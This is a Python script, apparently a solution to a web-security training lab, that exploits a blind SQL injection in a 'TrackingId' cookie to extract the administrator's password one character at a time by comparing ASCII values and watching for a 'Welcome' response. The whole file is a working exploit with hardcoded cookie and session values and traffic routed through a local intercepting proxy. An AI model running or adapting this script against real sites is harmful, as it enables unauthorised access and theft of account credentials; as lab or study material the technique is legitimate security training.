import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_exploit(url):
    password = ''
    for i in range(1, 21):  # password length is 20
        for j in range(32, 127):  # printable ASCII characters
            payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')={j}--"
            payload = urllib.parse.quote(payload) # URL encode the payload
            cookies = {'TrackingId': f"WUQUE2TXrti2rhqU{payload}", 'session': 'IokD1fvBBpojCe9lrPd8Mu9RkptY0CLU'}
            response = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
            # use stdout instead of print to avoid new line
            # use flush to force print immediately
            # -> live update effect
            if 'Welcome' not in response.text:
                sys.stdout.write("\r" + password)
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write("\r" + password)
                sys.stdout.flush()                
                break
    print(f"\nAdmin password: {password}")



def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} http://example.com")

    url = sys.argv[1]
    print("Retrieving admin password...")
    sqli_exploit(url)
    
if __name__ == '__main__':
    main()